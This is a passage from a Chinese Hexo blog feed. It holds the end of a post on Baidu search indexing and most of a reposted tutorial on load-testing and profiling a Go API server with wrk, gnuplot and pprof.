class="hljs-string">&quot;script&quot;</span>)[<span class="hljs-number">0</span>];<br>    s.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">insertBefore</span>(bp, s);<br>&#125;)();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>然后在文件主题配置文件<code>_config.yml</code> 中设置 即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">baidu_push: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>在搜索引擎搜索 <code>site:your_blog_url</code>，如果有内容，说明已经被搜索引擎收录。（大概率需要等待2-14天）</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://viflythink.com/Use_GithubPages_and_Hexo_to_build_blog_advanced">使用 Github Pages 和 Hexo 搭建个人博客(进阶篇)</a><br><a href="https://zhuanlan.zhihu.com/p/128033054">Hexo博客提交百度收录SEO</a></p><p>搜索引擎优化（SEO）</p>]]></content>
    
    
    <categories>
      
      <category>个人博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>个人博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go 性能分析（下）：API Server性能测试和调优实战</title>
    <link href="/2022/11/27/Go%20%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89%EF%BC%9AAPI%20Server%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E5%92%8C%E8%B0%83%E4%BC%98%E5%AE%9E%E6%88%98/"/>
    <url>/2022/11/27/Go%20%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89%EF%BC%9AAPI%20Server%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E5%92%8C%E8%B0%83%E4%BC%98%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer"># Go 性能分析（下）：API Server性能测试和调优实战<blockquote><p>本文章主要内容引用自：1.孔令飞，<a href="https://time.geekbang.org/column/article/410205">Go 语言项目开发实战</a></p></blockquote><p>学习了如何分析Go代码的性能。掌握了性能分析的基本知识之后，再来看下如何分析API接口的性能。</p><p>在API上线之前，我们需要知道API的性能，以便知道API服务器所能承载的最大请求量、性能瓶颈，再根据业务对性能的要求，来对API进行性能调优或者扩缩容。通过这些，可以使API稳定地对外提供服务，并且让请求在合理的时间内返回。这一讲，我就介绍如何用wrk工具来测试API Server接口的性能，并给出分析方法和结果。</p><h2 id="API性能测试指标"><a href="#API性能测试指标" class="headerlink" title="API性能测试指标"></a>API性能测试指标</h2><p>API性能测试，往大了说其实包括API框架的性能和指定API的性能。不过，因为指定API的性能跟该API具体的实现（比如有无数据库连接，有无复杂的逻辑处理等）有关，脱离了具体实现来探讨单个API的性能是毫无意义的，所以这篇文章只探讨API框架的性能。</p><p>用来衡量API性能的指标主要有3个：</p><ul><li><strong>并发数（Concurrent）</strong>：并发数是指某个时间范围内，同时在使用系统的用户个数。广义上的并发数是指同时使用系统的用户个数，这些用户可能调用不同的API；严格意义上的并发数是指同时请求同一个API的用户个数。这一讲我们讨论的并发数是严格意义上的并发数。</li><li><strong>每秒查询数（QPS）</strong>：每秒查询数QPS是对一个特定的查询服务器在规定时间内所处理流量多少的衡量标准。QPS &#x3D; 并发数 &#x2F; 平均请求响应时间。</li><li><strong>请求响应时间（TTLB</strong>）：请求响应时间指的是从客户端发出请求到得到响应的整个时间。这个过程从客户端发起的一个请求开始，到客户端收到服务器端的响应结束。在一些工具中，请求响应时间通常会被称为TTLB（Time to last byte，意思是从发送一个请求开始，到客户端收到最后一个字节的响应为止所消费的时间）。请求响应时间的单位一般为“秒”或“毫秒”。</li></ul><p>这三个指标中，衡量API性能的最主要指标是QPS，但是在说明QPS时，需要指明是多少并发数下的QPS，否则毫无意义，因为不同并发数下的QPS是不同的。举个例子，单用户100 QPS和100用户100 QPS是两个不同的概念，前者说明API可以在一秒内串行执行100个请求，而后者说明在并发数为100的情况下，API可以在一秒内处理100个请求。当QPS相同时，并发数越大，说明API性能越好，并发处理能力越强。</p><p>在并发数设置过大时，API同时要处理很多请求，会频繁切换上下文，而真正用于处理请求的时间变少，反而使得QPS会降低。并发数设置过大时，请求响应时间也会变长。API会有一个合适的并发数，在该并发数下，API的QPS可以达到最大，但该并发数不一定是最佳并发数，还要参考该并发数下的平均请求响应时间。</p><p>此外，在有些API接口中，也会测试API接口的TPS（Transactions Per Second，每秒事务数）。一个事务是指客户端向服务器发送请求，然后服务器做出反应的过程。客户端在发送请求时开始计时，收到服务器响应后结束计时，以此来计算使用的时间和完成的事务个数。</p><p>那么，TPS和QPS有什么区别呢？如果是对一个查询接口（单场景）压测，且这个接口内部不会再去请求其他接口，那么TPS&#x3D;QPS，否则，TPS≠QPS。如果是对多个接口（混合场景）压测，假设N个接口都是查询接口，且这个接口内部不会再去请求其他接口，QPS&#x3D;N*TPS。</p><h2 id="API性能测试方法"><a href="#API性能测试方法" class="headerlink" title="API性能测试方法"></a>API性能测试方法</h2><p>Linux下有很多Web性能测试工具，常用的有Jmeter、AB、Webbench和wrk。每个工具都有自己的特点，IAM项目使用wrk来对API进行性能测试。wrk非常简单，安装方便，测试结果也相对专业，并且可以支持Lua脚本来创建更复杂的测试场景。下面，我来介绍下wrk的安装方法和使用方法。</p><h3 id="wrk安装方法"><a href="#wrk安装方法" class="headerlink" title="wrk安装方法"></a>wrk安装方法</h3><p>wrk的安装很简单，一共可分为两步。</p><p>第一步，Clone wrk repo：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> https://github.com/wg/wrk<br><br></code></pre></td></tr></table></figure><p>第二步，编译并安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> wrk<br>$ make<br>$ sudo <span class="hljs-built_in">cp</span> ./wrk /usr/bin<br><br></code></pre></td></tr></table></figure><h3 id="wrk使用简介"><a href="#wrk使用简介" class="headerlink" title="wrk使用简介"></a>wrk使用简介</h3><p>这里来看下wrk的使用方法。wrk使用起来不复杂，执行 <code>wrk --help</code> 可以看到wrk的所有运行参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ wrk --<span class="hljs-built_in">help</span><br>Usage: wrk &lt;options&gt; &lt;url&gt;<br>  Options:<br>    -c, --connections &lt;N&gt;  Connections to keep open<br>    -d, --duration    &lt;T&gt;  Duration of <span class="hljs-built_in">test</span><br>    -t, --threads     &lt;N&gt;  Number of threads to use<br><br>    -s, --script      &lt;S&gt;  Load Lua script file<br>    -H, --header      &lt;H&gt;  Add header to request<br>        --latency          Print latency statistics<br>        --<span class="hljs-built_in">timeout</span>     &lt;T&gt;  Socket/request <span class="hljs-built_in">timeout</span><br>    -v, --version          Print version details<br><br>  Numeric arguments may include a SI unit (1k, 1M, 1G)<br>  Time arguments may include a time unit (2s, 2m, 2h)<br><br></code></pre></td></tr></table></figure><p>常用的参数有下面这些：</p><ul><li>-t，线程数（线程数不要太多，是核数的2到4倍就行，多了反而会因为线程切换过多造成效率降低）。</li><li>-c，并发数。</li><li>-d，测试的持续时间，默认为10s。</li><li>-T，请求超时时间。</li><li>-H，指定请求的HTTP Header，有些API需要传入一些Header，可通过wrk的-H参数来传入。</li><li>–latency，打印响应时间分布。</li><li>-s，指定Lua脚本，Lua脚本可以实现更复杂的请求。</li></ul><p>然后，我们来看一个wrk的测试结果，并对结果进行解析。</p><p>一个简单的测试如下（确保iam-apiserver已经启动，并且开启了健康检查）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ wrk -t 144 -c 30000 -d 30s -T 30s --latency http://10.0.4.57:8080/healthz<br>Running 30s <span class="hljs-built_in">test</span> @ http://10.0.4.57:8080/healthz<br>  144 threads and 30000 connections<br>  Thread Stats   Avg      Stdev     Max   +/- Stdev<br>    Latency   508.77ms  604.01ms   9.27s    81.59%<br>    Req/Sec   772.48      0.94k   10.45k    86.82%<br>  Latency Distribution<br>     50%  413.35ms<br>     75%  948.99ms<br>     90%    1.33s<br>     99%    2.44s<br>  2276265 requests <span class="hljs-keyword">in</span> 30.10s, 412.45MB <span class="hljs-built_in">read</span><br>  Socket errors: connect 1754, <span class="hljs-built_in">read</span> 40, write 0, <span class="hljs-built_in">timeout</span> 0<br>Requests/sec:  75613.16<br>Transfer/sec:     13.70MB<br><br></code></pre></td></tr></table></figure><p>下面是对测试结果的解析。</p><ul><li>144 threads and 30000 connections：用144个线程模拟20000个连接，分别对应-t和-c参数。</li><li>Thread Stats是线程统计，包括Latency和Req&#x2F;Sec。<ul><li>Latency：响应时间，有平均值、标准偏差、最大值、正负一个标准差占比。</li><li>Req&#x2F;Sec：每个线程每秒完成的请求数, 同样有平均值、标准偏差、最大值、正负一个标准差占比。</li></ul></li><li>Latency Distribution是响应时间分布。<ul><li>50%：50%的响应时间为413.35ms。</li><li>75%：75%的响应时间为948.99ms。</li><li>90%：90%的响应时间为1.33s。</li><li>99%：99%的响应时间为2.44s。</li></ul></li><li>2276265 requests in 30.10s, 412.45MB read：30.10s完成的总请求数（2276265）和数据读取量（412.45MB）。</li><li>Socket errors: connect 1754, read 40, write 0, timeout 0：错误统计，会统计connect连接失败请求个数（1754）、读失败请求个数、写失败请求个数、超时请求个数。</li><li>Requests&#x2F;sec：QPS。</li><li>Transfer&#x2F;sec：平均每秒读取13.70MB数据（吞吐量）。</li></ul><h2 id="API-Server性能测试实践"><a href="#API-Server性能测试实践" class="headerlink" title="API Server性能测试实践"></a>API Server性能测试实践</h2><p>接下来，我们就来测试下API Server的性能。影响API Server性能的因素有很多，除了iam-apiserver自身的原因之外，服务器的硬件和配置、测试方法、网络环境等都会影响。为了方便你对照性能测试结果，我给出了我的测试环境配置，你可以参考下。</p><ul><li>客户端硬件配置：1核4G。</li><li>客户端软件配置：干净的 <code>CentOS Linux release 8.2.2004 (Core)</code>。</li><li>服务端硬件配置：2核8G。</li><li>服务端软件配置：干净的 <code>CentOS Linux release 8.2.2004 (Core)</code>。</li><li>测试网络环境：腾讯云VPC内访问，除了性能测试程序外，没有其他资源消耗型业务程序。</li></ul><p>测试架构如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/7d/c4/7df51487bc7b761d79247a5d547745c4.jpg?wh=2248x575" alt="img"></p><h3 id="性能测试脚本介绍"><a href="#性能测试脚本介绍" class="headerlink" title="性能测试脚本介绍"></a>性能测试脚本介绍</h3><p>在做API Server的性能测试时，需要先执行wrk，生成性能测试数据。为了能够更直观地查看性能数据，我们还需要以图表的方式展示这些性能数据。这一讲，我使用 <code>gnuplot</code> 工具来自动化地绘制这些性能图，为此我们需要确保Linux服务器已经安装了 <code>gnuplot</code> 工具。可以通过以下方式安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo yum -y install gnuplot<br><br></code></pre></td></tr></table></figure><p>在测试中，绘制下面这两张图，通过它们来观测和分析API Server的性能。</p><ul><li>QPS &amp; TTLB图： <code>X</code> 轴为并发数（Concurrent）， <code>Y</code> 轴为每秒查询数（QPS）和请求响应时间（TTLB）。</li><li>成功率图： <code>X</code> 轴为并发数（Concurrent）， <code>Y</code> 轴为请求成功率。</li></ul><p>为了方便测试API接口性能，将性能测试和绘图逻辑封装在 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/scripts/wrktest.sh">scripts&#x2F;wrktest.sh</a> 脚本中，可以在iam源码根目录下执行如下命令，生成性能测试数据和性能图表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ scripts/wrktest.sh http://10.0.4.57:8080/healthz<br><br></code></pre></td></tr></table></figure><p>上面的命令会执行性能测试，记录性能测试数据，并根据这些性能测试数据绘制出QPS和成功率图。</p><p>接下来，再来介绍下wrktest.sh性能测试脚本，并给出一个使用示例。</p><p>wrktest.sh性能测试脚本，用来测试API Server的性能，记录测试的性能数据，并根据性能数据使用gnuplot绘制性能图。</p><p>wrktest.sh也可以对比前后两次的性能测试结果，并将对比结果通过图表展示出来。wrktest.sh会根据CPU的核数自动计算出适合的wrk启动线程数（ <code>-t</code>）： <code>CPU核数 * 3</code>。</p><p>wrktest.sh默认会测试多个并发下的API性能，默认测试的并发数为 <code>200 500 1000 3000 5000 10000 15000 20000 25000 50000</code>。需要根据自己的服务器配置选择测试的最大并发数，这里因为服务器配置不高（主要是 <code>8G</code> 内存在高并发下，很容易就耗尽），最大并发数选择了 <code>50000</code>。如果你的服务器配置够高，可以再依次尝试下测试 <code>100000</code> 、 <code>200000</code> 、 <code>500000</code> 、 <code>1000000</code> 并发下的API性能。</p><p>wrktest.sh的使用方法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ scripts/wrktest.sh -h<br><br>Usage: scripts/wrktest.sh [OPTION] [diff] URL<br>Performance automation <span class="hljs-built_in">test</span> script.<br><br>  URL                    HTTP request url, like: http://10.0.4.57:8080/healthz<br>  diff                   Compare two performance <span class="hljs-built_in">test</span> results<br><br>OPTIONS:<br>  -h                     Usage information<br>  -n                     Performance <span class="hljs-built_in">test</span> task name, default: apiserver<br>  -d                     Directory used to store performance data and gnuplot graphic, default: _output/wrk<br><br>Reprot bugs to &lt;colin404@foxmail.com&gt;.<br><br></code></pre></td></tr></table></figure><p>wrktest.sh提供的命令行参数介绍如下。</p><ul><li>URL：需要测试的API接口。</li><li>diff：如果比较两次测试的结果，需要执行wrktest.sh diff 。</li><li>-n：本次测试的任务名，wrktest.sh会根据任务名命名生成的文件。</li><li>-d：输出文件存放目录。</li><li>-h：打印帮助信息。</li></ul><p>下面，展示一个wrktest.sh使用示例。</p><p>wrktest.sh的主要功能有两个，分别是运行性能测试并获取结果和对比性能测试结果。下面分别介绍下它们的具体使用方法。</p><ol><li>运行性能测试并获取结果</li></ol><p>执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ scripts/wrktest.sh http://10.0.4.57:8080/healthz<br>Running wrk <span class="hljs-built_in">command</span>: wrk -t3 -d300s -T30s --latency -c 200 http://10.0.4.57:8080/healthz<br>Running wrk <span class="hljs-built_in">command</span>: wrk -t3 -d300s -T30s --latency -c 500 http://10.0.4.57:8080/healthz<br>Running wrk <span class="hljs-built_in">command</span>: wrk -t3 -d300s -T30s --latency -c 1000 http://10.0.4.57:8080/healthz<br>Running wrk <span class="hljs-built_in">command</span>: wrk -t3 -d300s -T30s --latency -c 3000 http://10.0.4.57:8080/healthz<br>Running wrk <span class="hljs-built_in">command</span>: wrk -t3 -d300s -T30s --latency -c 5000 http://10.0.4.57:8080/healthz<br>Running wrk <span class="hljs-built_in">command</span>: wrk -t3 -d300s -T30s --latency -c 10000 http://10.0.4.57:8080/healthz<br>Running wrk <span class="hljs-built_in">command</span>: wrk -t3 -d300s -T30s --latency -c 15000 http://10.0.4.57:8080/healthz<br>Running wrk <span class="hljs-built_in">command</span>: wrk -t3 -d300s -T30s --latency -c 20000 http://10.0.4.57:8080/healthz<br>Running wrk <span class="hljs-built_in">command</span>: wrk -t3 -d300s -T30s --latency -c 25000 http://10.0.4.57:8080/healthz<br>Running wrk <span class="hljs-built_in">command</span>: wrk -t3 -d300s -T30s --latency -c 50000 http://10.0.4.57:8080/healthz<br><br>Now plot according to /home/colin/_output/wrk/apiserver.dat<br>QPS graphic file is: /home/colin/_output/wrk/apiserver_qps_ttlb.png<br>Success rate graphic file is: /home/colin/_output/wrk/apiserver_successrate.pngz<br><br></code></pre></td></tr></table></figure><p>上面的命令默认会在 <code>_output/wrk/</code> 目录下生成3个文件：</p><ul><li>apiserver.dat，wrk性能测试结果，每列含义分别为并发数、QPS 平均响应时间、成功率。</li><li>apiserver_qps_ttlb.png，QPS&amp;TTLB图。</li><li>apiserver_successrate.png，成功率图。</li></ul><p>这里要注意，请求URL中的IP地址应该是腾讯云VPC内网地址，因为通过内网访问，不仅网络延时最低，而且还最安全，所以真实的业务通常都是内网访问的。</p><ol><li>对比性能测试结果</li></ol><p>假设我们还有另外一次API性能测试，测试数据保存在 <code>_output/wrk/http.dat</code> 文件中。</p><p>执行如下命令，对比两次测试结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ scripts/wrktest.sh diff _output/wrk/apiserver.dat _output/wrk/http.dat<br><br></code></pre></td></tr></table></figure><p><code>apiserver.dat</code> 和 <code>http.dat</code> 是两个需要对比的Wrk性能数据文件。上述命令默认会在 <code>_output/wrk</code> 目录下生成下面这两个文件：</p><ul><li>apiserver_http.qps.ttlb.diff.png，QPS &amp; TTLB对比图。</li><li>apiserver_http.success_rate.diff.png，成功率对比图。</li></ul><h3 id="关闭Debug配置选项"><a href="#关闭Debug配置选项" class="headerlink" title="关闭Debug配置选项"></a>关闭Debug配置选项</h3><p>在测试之前，我们需要关闭一些Debug选项，以免影响性能测试。</p><p>执行下面这两步操作，修改iam-apiserver的配置文件：</p><ul><li>将 <code>server.mode</code> 设置为release， <code>server.middlewares</code> 去掉dump、logger中间件。</li><li>将 <code>log.level</code> 设置为info， <code>log.output-paths</code> 去掉stdout。</li></ul><p>因为我们要在执行压力测试时分析程序的性能，所以需要设置 <code>feature.profiling</code> 为true，以开启性能分析。修改完之后，重新启动iam-apiserver。</p><h3 id="使用wrktest-sh测试IAM-API接口性能"><a href="#使用wrktest-sh测试IAM-API接口性能" class="headerlink" title="使用wrktest.sh测试IAM API接口性能"></a>使用wrktest.sh测试IAM API接口性能</h3><p>关闭Debug配置选项之后，就可以执行 <code>wrktest.sh</code> 命令测试API性能了（默认测试的并发数为 <code>200 500 1000 3000 5000 10000 15000 20000 25000 50000</code>）:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ scripts/wrktest.sh http://10.0.4.57:8080/healthz<br><br></code></pre></td></tr></table></figure><p>生成的QPS &amp; TTLB图和成功率图分别如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/0a/0f/0aca3648e72974c5a32c2fbcfea8670f.png?wh=640x480" alt="img"></p><p>上图中， <code>X</code> 轴为并发数（Concurrent）， <code>Y</code> 轴为每秒查询数（QPS）和请求响应时间（TTLB）。</p><p><img src="https://static001.geekbang.org/resource/image/a2/5d/a2d7866536ee96327a10614dd332475d.png?wh=640x480" alt="img"></p><p>上图中， <code>X</code> 轴为并发数（Concurrent）， <code>Y</code> 轴为请求成功率。</p><p>通过上面两张图，你可以看到，API Server在并发数为 <code>200</code> 时，QPS最大；并发数为 <code>500</code>，平均响应时间为 <code>56.33ms</code>，成功率为 <code>100.00%</code> 。在并发数达到 <code>1000</code> 时，成功率开始下降。一些详细数据从图里看不到，你可以直接查看 <code>apiserver.dat</code> 文件，里面记录了每个并发下具体的QPS、TTLB和成功率数据。</p><p>现在我们有了API Server的性能数据，那么该API Server的QPS处于什么水平呢？一方面，你可以根据自己的业务需要来对比；另一方面，可以和性能更好的Web框架进行对比，总之需要有个参照。</p><p>这里用net&#x2F;http构建最简单的HTTP服务器，使用相同的测试工具和测试服务器，测试性能并作对比。HTTP服务源码为（位于文件 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/tools/httptest/main.go">tools&#x2F;httptest&#x2F;main.go</a> 中）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/healthz&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>message := <span class="hljs-string">`&#123;&quot;status&quot;:&quot;ok&quot;&#125;`</span><br>fmt.Fprint(w, message)<br>&#125;)<br><br>addr := <span class="hljs-string">&quot;:6667&quot;</span><br>fmt.Printf(<span class="hljs-string">&quot;Serving http service on %s\n&quot;</span>, addr)<br>log.Fatal(http.ListenAndServe(addr, <span class="hljs-literal">nil</span>))<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们将上述HTTP服务的请求路径设置为 <code>/healthz</code>，并且返回 <code>&#123;&quot;status&quot;:&quot;ok&quot;&#125;</code>，跟API Server的接口返回数据完全一样。通过这种方式，你可以排除因为返回数据大小不同而造成的性能差异。</p><p>可以看到，该HTTP服务器很简单，只是利用 <code>net/http</code> 包最原生的功能，在Go中几乎所有的Web框架都是基于 <code>net/http</code> 包封装的。既然是封装，肯定比不上原生的性能，所以我们要把它跟用 <code>net/http</code> 直接启动的HTTP服务接口的性能进行对比，来衡量我们的API Server性能。</p><p>我们需要执行相同的wrk测试，并将结果跟API Server的测试结果进行对比，将对比结果绘制成对比图。具体对比过程可以分为3步。</p><p>第一步，启动HTTP服务。</p><p>在iam源码根目录下执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go run tools/httptest/main.go<br><br></code></pre></td></tr></table></figure><p>第二步，执行 <code>wrktest.sh</code> 脚本，测试该HTTP服务的性能：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ scripts/wrktest.sh -n http http://10.0.4.57:6667/healthz<br><br></code></pre></td></tr></table></figure><p>上述命令会生成 <code>_output/wrk/http.dat</code> 文件。</p><p>第三步，对比两次性能测试数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ scripts/wrktest.sh diff _output/wrk/apiserver.dat _output/wrk/http.dat<br><br></code></pre></td></tr></table></figure><p>生成的两张对比图表，如下所示：</p><p><img src="https://static001.geekbang.org/resource/image/51/f4/51eacf20d190080bf8b42e2f43yy00f4.png?wh=640x480" alt="img"></p><p><img src="https://static001.geekbang.org/resource/image/e1/99/e1cc646da40036a44e5300ed2bef8999.png?wh=640x480" alt="img"></p><p>通过上面两张对比图，我们可以看出，API Server在QPS、响应时间和成功率上都不如原生的HTTP Server，特别是QPS，最大QPS只有原生HTTP Server 最大QPS的 <code>13.68%</code>，性能需要调优。</p><h2 id="API-Server性能分析"><a href="#API-Server性能分析" class="headerlink" title="API Server性能分析"></a>API Server性能分析</h2><p>上面，我们测试了API接口的性能，如果性能不合预期，我们还需要分析性能数据，并优化性能。</p><p>在分析前我们需要对API Server加压，在加压的情况下，API接口的性能才更可能暴露出来，所以继续执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ scripts/wrktest.sh http://10.0.4.57:8080/healthz<br><br></code></pre></td></tr></table></figure><p>在上述命令执行压力测试期间，可以打开另外一个Linux终端，使用 <code>go tool pprof</code> 工具分析HTTP的profile文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go tool pprof http://10.0.4.57:8080/debug/pprof/profile<br><br></code></pre></td></tr></table></figure><p>执行完 <code>go tool pprof</code> 后，因为需要采集性能数据，所以该命令会阻塞30s。</p><p>在pprof交互shell中，执行 <code>top -cum</code> 查看累积采样时间，我们执行 <code>top30 -cum</code>，多观察一些函数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">(pprof) top20 -cum<br>Showing nodes accounting <span class="hljs-keyword">for</span> 32.12s, 39.62% of 81.07s total<br>Dropped 473 nodes (cum &lt;= 0.41s)<br>Showing top 20 nodes out of 167<br>(pprof) top30 -cum<br>Showing nodes accounting <span class="hljs-keyword">for</span> 11.82s, 20.32% of 58.16s total<br>Dropped 632 nodes (cum &lt;= 0.29s)<br>Showing top 30 nodes out of 239<br>      flat  flat%   <span class="hljs-built_in">sum</span>%        cum   cum%<br>     0.10s  0.17%  0.17%     51.59s 88.70%  net/http.(*conn).serve<br>     0.01s 0.017%  0.19%     42.86s 73.69%  net/http.serverHandler.ServeHTTP<br>     0.04s 0.069%  0.26%     42.83s 73.64%  github.com/gin-gonic/gin.(*Engine).ServeHTTP<br>     0.01s 0.017%  0.28%     42.67s 73.37%  github.com/gin-gonic/gin.(*Engine).handleHTTPRequest<br>     0.08s  0.14%  0.41%     42.59s 73.23%  github.com/gin-gonic/gin.(*Context).Next (inline)<br>     0.03s 0.052%  0.46%     42.58s 73.21%  .../internal/pkg/middleware.RequestID.func1<br>         0     0%  0.46%     41.02s 70.53%  .../internal/pkg/middleware.Context.func1<br>     0.01s 0.017%  0.48%     40.97s 70.44%  github.com/gin-gonic/gin.CustomRecoveryWithWriter.func1<br>     0.03s 0.052%  0.53%     40.95s 70.41%  .../internal/pkg/middleware.LoggerWithConfig.func1<br>     0.01s 0.017%  0.55%     33.46s 57.53%  .../internal/pkg/middleware.NoCache<br>     0.08s  0.14%  0.69%     32.58s 56.02%  github.com/tpkeeper/gin-dump.DumpWithOptions.func1<br>     0.03s 0.052%  0.74%     24.73s 42.52%  github.com/tpkeeper/gin-dump.FormatToBeautifulJson<br>     0.02s 0.034%  0.77%     22.73s 39.08%  github.com/tpkeeper/gin-dump.BeautifyJsonBytes<br>     0.08s  0.14%  0.91%     16.39s 28.18%  github.com/tpkeeper/gin-dump.format<br>     0.21s  0.36%  1.27%     16.38s 28.16%  github.com/tpkeeper/gin-dump.formatMap<br>     3.75s  6.45%  7.72%     13.71s 23.57%  runtime.mallocgc<br>     ...<br><br></code></pre></td></tr></table></figure><p>因为 <code>top30</code> 内容过多，这里只粘贴了耗时最多的一些关联函数。从上面的列表中，可以看到有ServeHTTP类的函数，这些函数是gin&#x2F;http自带的函数，我们无需对此进行优化。</p><p>还有这样一些函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">.../gin.(*Context).Next 